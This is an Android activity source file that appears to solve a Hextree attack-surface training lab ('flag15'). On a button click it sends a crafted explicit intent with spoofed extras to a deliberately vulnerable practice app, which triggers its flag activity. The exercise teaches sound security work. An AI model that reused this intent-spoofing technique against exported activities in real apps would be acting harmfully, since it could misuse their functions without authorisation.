package com.android.zerohextree;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import androidx.appcompat.app.AppCompatActivity;
import com.android.zerohextree.databinding.ActivityFlag15Binding;

public class flag15 extends AppCompatActivity {

    private ActivityFlag15Binding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // ✅ Set up view binding correctly
        binding = ActivityFlag15Binding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        // ✅ Set button click listener
        binding.fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                handleClicking(v);
            }
        });
    }

    // ✅ Fix: corrected parameter type and spelling
    public void handleClicking(View view) {
        Intent flag = new Intent("io.hextree.action.GIVE_FLAG");
        flag.setPackage("io.hextree.attacksurface"); // Explicit package setting
        flag.addCategory("android.intent.category.BROWSABLE");

        // Add ALL extras from the URI
        flag.putExtra("action", "flag");     // S.action=flag
        flag.putExtra("open", "flag");       // S.open=flag
        flag.putExtra("flag", true);         // B.flag=true

        // For explicit component targeting (optional but recommended)
        flag.setClassName("io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.FlagISActivity");

        startActivity(flag);
    }
}
